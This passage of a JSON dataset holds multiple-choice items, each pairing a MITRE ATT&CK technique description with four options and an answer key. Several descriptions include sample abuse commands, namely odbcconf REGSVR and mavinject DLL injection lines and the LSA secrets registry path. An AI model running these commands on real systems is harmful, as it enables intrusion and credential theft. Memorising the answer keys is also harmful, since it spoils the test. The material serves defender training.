    "instruction": "Answer which mitre technique is related to the description: Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts. LSA secrets are stored in the registry at <code>HKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets</code>. LSA secrets can also be dumped from memory.\n\nReg can be used to extract from the Registry. Mimikatz can be used to extract secrets from memory.\nA. Masquerading: Masquerade File Type, B. Traffic Signaling, C. Obfuscated Files or Information: LNK Icon Smuggling, D. OS Credential Dumping: LSA Secrets",
    "context": "",
    "output": "D. OS Credential Dumping: LSA Secrets",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts. LSA secrets are stored in the registry at <code>HKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets</code>. LSA secrets can also be dumped from memory.\n\nReg can be used to extract from the Registry. Mimikatz can be used to extract secrets from memory.",
      "options": "A. Masquerading: Masquerade File Type, B. Traffic Signaling, C. Obfuscated Files or Information: LNK Icon Smuggling, D. OS Credential Dumping: LSA Secrets",
      "choice": "D. OS Credential Dumping: LSA Secrets",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect. \n\n\nROMMON is a Cisco network device firmware that functions as a boot loader, boot image, or boot helper to initialize hardware and software when the platform is powered on or reset. Similar to TFTP Boot, an adversary may upgrade the ROMMON image locally or remotely (for example, through TFTP) with adversary code and restart the device in order to overwrite the existing ROMMON image. This provides adversaries with the means to update the ROMMON to gain persistence on a system in a way that may be difficult to detect.\nA. System Services: Launchctl, B. Pre-OS Boot: ROMMONkit, C. Boot or Logon Autostart Execution: Print Processors, D. Automated Collection",
    "context": "",
    "output": "B. Pre-OS Boot: ROMMONkit",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect. \n\n\nROMMON is a Cisco network device firmware that functions as a boot loader, boot image, or boot helper to initialize hardware and software when the platform is powered on or reset. Similar to TFTP Boot, an adversary may upgrade the ROMMON image locally or remotely (for example, through TFTP) with adversary code and restart the device in order to overwrite the existing ROMMON image. This provides adversaries with the means to update the ROMMON to gain persistence on a system in a way that may be difficult to detect.",
      "options": "A. System Services: Launchctl, B. Pre-OS Boot: ROMMONkit, C. Boot or Logon Autostart Execution: Print Processors, D. Automated Collection",
      "choice": "B. Pre-OS Boot: ROMMONkit",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may grant additional permission levels to maintain persistent access to an adversary-controlled email account. \n\nFor example, the <code>Add-MailboxPermission</code> PowerShell cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox. In Google Workspace, delegation can be enabled via the Google Admin console and users can delegate accounts via their Gmail settings. \n\nAdversaries may also assign mailbox folder permissions through individual folder permissions or roles. In Office 365 environments, adversaries may assign the Default or Anonymous user permissions or roles to the Top of Information Store (root), Inbox, or other mailbox folders. By assigning one or both user permissions to a folder, the adversary can utilize any other account in the tenant to maintain persistence to the target user\u2019s mail folders.\n\nThis may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can add Additional Cloud Roles to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex: Internal Spearphishing), so the messages evade spam/phishing detection mechanisms.\n\nPossible answers:\nA. Account Manipulation: Additional Email Delegate Permissions, B. Endpoint Denial of Service: OS Exhaustion Flood, C. Event Triggered Execution, D. Steal or Forge Authentication Certificates",
    "context": "",
    "output": "A. Account Manipulation: Additional Email Delegate Permissions",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may grant additional permission levels to maintain persistent access to an adversary-controlled email account. \n\nFor example, the <code>Add-MailboxPermission</code> PowerShell cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox. In Google Workspace, delegation can be enabled via the Google Admin console and users can delegate accounts via their Gmail settings. \n\nAdversaries may also assign mailbox folder permissions through individual folder permissions or roles. In Office 365 environments, adversaries may assign the Default or Anonymous user permissions or roles to the Top of Information Store (root), Inbox, or other mailbox folders. By assigning one or both user permissions to a folder, the adversary can utilize any other account in the tenant to maintain persistence to the target user\u2019s mail folders.\n\nThis may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can add Additional Cloud Roles to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex: Internal Spearphishing), so the messages evade spam/phishing detection mechanisms.",
      "options": "A. Account Manipulation: Additional Email Delegate Permissions, B. Endpoint Denial of Service: OS Exhaustion Flood, C. Event Triggered Execution, D. Steal or Forge Authentication Certificates",
      "choice": "A. Account Manipulation: Additional Email Delegate Permissions",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system. Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.\n\nOnce malicious home pages have been added to the user\u2019s mailbox, they will be loaded when Outlook is started. Malicious Home Pages will execute when the right Outlook folder is loaded/reloaded.\n\nA. Server Software Component, B. Remote Services: VNC, C. Office Application Startup: Outlook Home Page, D. Audio Capture\nAnswer:",
    "context": "",
    "output": "C. Office Application Startup: Outlook Home Page",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system. Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.\n\nOnce malicious home pages have been added to the user\u2019s mailbox, they will be loaded when Outlook is started. Malicious Home Pages will execute when the right Outlook folder is loaded/reloaded.",
      "options": "A. Server Software Component, B. Remote Services: VNC, C. Office Application Startup: Outlook Home Page, D. Audio Capture",
      "choice": "C. Office Application Startup: Outlook Home Page",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names. The Odbcconf.exe binary may be digitally signed by Microsoft.\n\nAdversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to Regsvr32, odbcconf.exe has a <code>REGSVR</code> flag that can be misused to execute DLLs (ex: <code>odbcconf.exe /S /A &lbrace;REGSVR \"C:\\Users\\Public\\file.dll\"&rbrace;</code>).\n\nPossible answers:\nA. System Service Discovery, B. Scheduled Task/Job, C. System Binary Proxy Execution: Odbcconf, D. Impair Defenses: Spoof Security Alerting",
    "context": "",
    "output": "C. System Binary Proxy Execution: Odbcconf",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names. The Odbcconf.exe binary may be digitally signed by Microsoft.\n\nAdversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to Regsvr32, odbcconf.exe has a <code>REGSVR</code> flag that can be misused to execute DLLs (ex: <code>odbcconf.exe /S /A &lbrace;REGSVR \"C:\\Users\\Public\\file.dll\"&rbrace;</code>).",
      "options": "A. System Service Discovery, B. Scheduled Task/Job, C. System Binary Proxy Execution: Odbcconf, D. Impair Defenses: Spoof Security Alerting",
      "choice": "C. System Binary Proxy Execution: Odbcconf",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: Adversaries may use an OSI the technique for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.\n\nA. Cloud Infrastructure Discovery, B. Multi-Factor Authentication Request Generation, C. Non-Application Layer Protocol, D. Boot or Logon Initialization Scripts: Logon Script (Windows)\nA:",
    "context": "",
    "output": "C. Non-Application Layer Protocol",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may use an OSI the technique for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
      "options": "A. Cloud Infrastructure Discovery, B. Multi-Factor Authentication Request Generation, C. Non-Application Layer Protocol, D. Boot or Logon Initialization Scripts: Logon Script (Windows)",
      "choice": "C. Non-Application Layer Protocol",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. \n\nBefore creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data). Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value.  \n\nAlthough small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process\u2019s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process\u2019s EWM.\n\nExecution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as <code>WriteProcessMemory</code> and <code>CreateRemoteThread</code>. More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.   \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process.\n\nA. Obfuscated Files or Information: Dynamic API Resolution, B. Dynamic Resolution: DNS Calculation, C. Process Injection: Extra Window Memory Injection, D. Data Staged: Remote Data Staging\nAnswer:",
    "context": "",
    "output": "C. Process Injection: Extra Window Memory Injection",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. \n\nBefore creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data). Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value.  \n\nAlthough small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process\u2019s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process\u2019s EWM.\n\nExecution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as <code>WriteProcessMemory</code> and <code>CreateRemoteThread</code>. More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.   \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process.",
      "options": "A. Obfuscated Files or Information: Dynamic API Resolution, B. Dynamic Resolution: DNS Calculation, C. Process Injection: Extra Window Memory Injection, D. Data Staged: Remote Data Staging",
      "choice": "C. Process Injection: Extra Window Memory Injection",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may abuse mavinject.exe to proxy execution of malicious code. Mavinject.exe is the Microsoft Application Virtualization Injector, a Windows utility that can inject code into external processes as part of Microsoft Application Virtualization (App-V).\n\nAdversaries may abuse mavinject.exe to inject malicious DLLs into running processes (i.e. Dynamic-link Library Injection), allowing for arbitrary code execution (ex. <code>C:\\Windows\\system32\\mavinject.exe PID /INJECTRUNNING PATH_DLL</code>). Since mavinject.exe may be digitally signed by Microsoft, proxying execution via this method may evade detection by security products because the execution is masked under a legitimate process. \n\nIn addition to Dynamic-link Library Injection, Mavinject.exe can also be abused to perform import descriptor injection via its  <code>/HMODULE</code> command-line parameter (ex. <code>mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER</code>). This command would inject an import table entry consisting of the specified DLL into the module at the given base address.\n\nA. System Binary Proxy Execution: Mavinject, B. Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, C. Gather Victim Identity Information: Employee Names, D. Impair Defenses: Disable or Modify Cloud Firewall\nAnswer:",
    "context": "",
    "output": "A. System Binary Proxy Execution: Mavinject",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may abuse mavinject.exe to proxy execution of malicious code. Mavinject.exe is the Microsoft Application Virtualization Injector, a Windows utility that can inject code into external processes as part of Microsoft Application Virtualization (App-V).\n\nAdversaries may abuse mavinject.exe to inject malicious DLLs into running processes (i.e. Dynamic-link Library Injection), allowing for arbitrary code execution (ex. <code>C:\\Windows\\system32\\mavinject.exe PID /INJECTRUNNING PATH_DLL</code>). Since mavinject.exe may be digitally signed by Microsoft, proxying execution via this method may evade detection by security products because the execution is masked under a legitimate process. \n\nIn addition to Dynamic-link Library Injection, Mavinject.exe can also be abused to perform import descriptor injection via its  <code>/HMODULE</code> command-line parameter (ex. <code>mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER</code>). This command would inject an import table entry consisting of the specified DLL into the module at the given base address.",
      "options": "A. System Binary Proxy Execution: Mavinject, B. Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, C. Gather Victim Identity Information: Employee Names, D. Impair Defenses: Disable or Modify Cloud Firewall",
      "choice": "A. System Binary Proxy Execution: Mavinject",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may use trusted scripts, often signed with certificates, to proxy the execution of malicious files. Several Microsoft signed scripts that have been downloaded from Microsoft or are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.\n\nPossible answers:\nA. Subvert Trust Controls: Code Signing, B. Event Triggered Execution: Component Object Model Hijacking, C. Data Manipulation: Stored Data Manipulation, D. System Script Proxy Execution",
    "context": "",
    "output": "D. System Script Proxy Execution",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may use trusted scripts, often signed with certificates, to proxy the execution of malicious files. Several Microsoft signed scripts that have been downloaded from Microsoft or are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.",
      "options": "A. Subvert Trust Controls: Code Signing, B. Event Triggered Execution: Component Object Model Hijacking, C. Data Manipulation: Stored Data Manipulation, D. System Script Proxy Execution",
      "choice": "D. System Script Proxy Execution",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predictable network path `\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`. \n\nLike other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.\n\nMalicious GPO modifications can be used to implement many other malicious behaviors such as Scheduled Task/Job, Disable or Modify Tools, Ingress Tool Transfer, Create Account, Service Execution,  and more. Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.\n\nFor example, publicly available scripts such as <code>New-GPOImmediateTask</code> can be leveraged to automate the creation of a malicious Scheduled Task/Job by modifying GPO settings, in this case modifying <code>&lt;GPO_PATH&gt;\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml</code>. In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in <code>&lt;GPO_PATH&gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf</code>, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.\nA. Stage Capabilities: Drive-by Target, B. Acquire Infrastructure: Malvertising, C. Domain or Tenant Policy Modification: Group Policy Modification, D. Process Injection: Extra Window Memory Injection",
    "context": "",
    "output": "C. Domain or Tenant Policy Modification: Group Policy Modification",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predictable network path `\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`. \n\nLike other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.\n\nMalicious GPO modifications can be used to implement many other malicious behaviors such as Scheduled Task/Job, Disable or Modify Tools, Ingress Tool Transfer, Create Account, Service Execution,  and more. Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.\n\nFor example, publicly available scripts such as <code>New-GPOImmediateTask</code> can be leveraged to automate the creation of a malicious Scheduled Task/Job by modifying GPO settings, in this case modifying <code>&lt;GPO_PATH&gt;\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml</code>. In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in <code>&lt;GPO_PATH&gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf</code>, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.",
      "options": "A. Stage Capabilities: Drive-by Target, B. Acquire Infrastructure: Malvertising, C. Domain or Tenant Policy Modification: Group Policy Modification, D. Process Injection: Extra Window Memory Injection",
      "choice": "C. Domain or Tenant Policy Modification: Group Policy Modification",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment. Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. Environmental keying is an implementation of Execution Guardrails that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.\n\nValues can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses. By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult. These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures (TTPs).\n\nSimilar to Obfuscated Files or Information, adversaries may use environmental keying to help protect their TTPs and evade detection. Environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution. By utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection. Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult. This can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.\n\nLike other Execution Guardrails, environmental keying can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This activity is distinct from typical Virtualization/Sandbox Evasion. While use of Virtualization/Sandbox Evasion may involve checking for known sandbox values and continuing with execution only if there is no match, the use of environmental keying will involve checking for an expected target-specific value that must match for decryption and subsequent execution to be successful.\n\nOptions:\nA. Execution Guardrails: Environmental Keying, B. Input Capture: Credential API Hooking, C. Remote Services: Distributed Component Object Model, D. Hijack Execution Flow: DLL Side-Loading",
    "context": "",
    "output": "A. Execution Guardrails: Environmental Keying",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment. Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. Environmental keying is an implementation of Execution Guardrails that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.\n\nValues can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses. By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult. These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures (TTPs).\n\nSimilar to Obfuscated Files or Information, adversaries may use environmental keying to help protect their TTPs and evade detection. Environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution. By utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection. Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult. This can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.\n\nLike other Execution Guardrails, environmental keying can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This activity is distinct from typical Virtualization/Sandbox Evasion. While use of Virtualization/Sandbox Evasion may involve checking for known sandbox values and continuing with execution only if there is no match, the use of environmental keying will involve checking for an expected target-specific value that must match for decryption and subsequent execution to be successful.",
      "options": "A. Execution Guardrails: Environmental Keying, B. Input Capture: Credential API Hooking, C. Remote Services: Distributed Component Object Model, D. Hijack Execution Flow: DLL Side-Loading",
      "choice": "A. Execution Guardrails: Environmental Keying",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. \n\nThere are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel. \n\nThe technique may also be abused by adversaries during Dynamic Resolution. Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets. \n\nAdversaries may also leverage The technique in conjunction with Proxy and/or Protocol Impersonation to further conceal C2 communications and infrastructure.\n\nPossible answers:\nA. Protocol Tunneling, B. Brute Force: Password Cracking, C. Steal or Forge Kerberos Tickets: Silver Ticket, D. Data from Local System",
    "context": "",
    "output": "A. Protocol Tunneling",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. \n\nThere are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel. \n\nThe technique may also be abused by adversaries during Dynamic Resolution. Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets. \n\nAdversaries may also leverage The technique in conjunction with Proxy and/or Protocol Impersonation to further conceal C2 communications and infrastructure.",
      "options": "A. Protocol Tunneling, B. Brute Force: Password Cracking, C. Steal or Forge Kerberos Tickets: Silver Ticket, D. Data from Local System",
      "choice": "A. Protocol Tunneling",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control.\nA. Data Obfuscation: Steganography, B. Rootkit, C. Obtain Capabilities, D. Boot or Logon Autostart Execution: Port Monitors",
    "context": "",
    "output": "A. Data Obfuscation: Steganography",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control.",
      "options": "A. Data Obfuscation: Steganography, B. Rootkit, C. Obtain Capabilities, D. Boot or Logon Autostart Execution: Port Monitors",
      "choice": "A. Data Obfuscation: Steganography",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may gather information about the victim's host hardware that can be used during targeting. Information about hardware infrastructure may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: card/biometric readers, dedicated encryption hardware, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning (ex: hostnames, server banners, user agent strings) or Phishing for Information. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors. Information about the hardware infrastructure may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Compromise Hardware Supply Chain or Hardware Additions).\nA. Search Open Technical Databases: Digital Certificates, B. Gather Victim Host Information: Hardware, C. Remote Services: SSH, D. Indirect Command Execution\nAnswer:",
    "context": "",
    "output": "B. Gather Victim Host Information: Hardware",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may gather information about the victim's host hardware that can be used during targeting. Information about hardware infrastructure may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: card/biometric readers, dedicated encryption hardware, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning (ex: hostnames, server banners, user agent strings) or Phishing for Information. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors. Information about the hardware infrastructure may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Compromise Hardware Supply Chain or Hardware Additions).",
